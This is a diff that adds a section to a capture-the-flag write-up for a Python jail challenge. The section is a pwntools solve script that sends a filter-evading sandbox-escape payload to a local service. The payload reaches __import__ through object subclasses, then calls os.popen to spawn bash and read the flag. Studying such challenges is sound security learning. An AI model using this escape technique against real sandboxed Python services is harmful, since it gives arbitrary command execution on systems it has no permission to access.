@@ -137,3 +137,27 @@ Attempts failed due to length requirements:
 
 - `__globals__["builtins"]`: require a literal later
 - `code.interact()`: the last length is 8, too long
+
+Alternative approach from the [official writeup](https://github.com/jailctf/challenges-2026/blob/master/collatz/solve/solve.py) using comments (`#`) to consume excess characters and `\r` to separate lines, bypassing the word-length check by hiding identifiers in comments:
+
+```python
+from pwn import *
+
+p = remote('localhost', 5000)
+
+p.sendline(r'''
+[*().__class__.#aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+__subclasses__()[~-~-~(()==())].__new__.#aaaaaaaaaaaaaaaaaaaaaa
+__globals__["__builtins__ZZZZZZZZZZZZZZZZZZZZZZ"[:0x00000000000000C]]["__import__ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"[:0x00000000000000000000000A]]
+("osZZZZZZZZZZZ"[:0x00000000000000000000000000000000000002]).#aaaaaaaaaaaaaaaaaaaa aaaaaaaaaa
+popen("6767676767676767;\u0062ash")]
+'''.strip().replace('\n', '\r').encode())
+
+p.sendline(b'9')
+p.sendlineafter(b": not found\n", b"/readflag 'please im begging you' >&2")
+flag = p.recvline().decode().strip()
+print(f"{flag = }")
+
+p.interactive()
+p.close()
+```
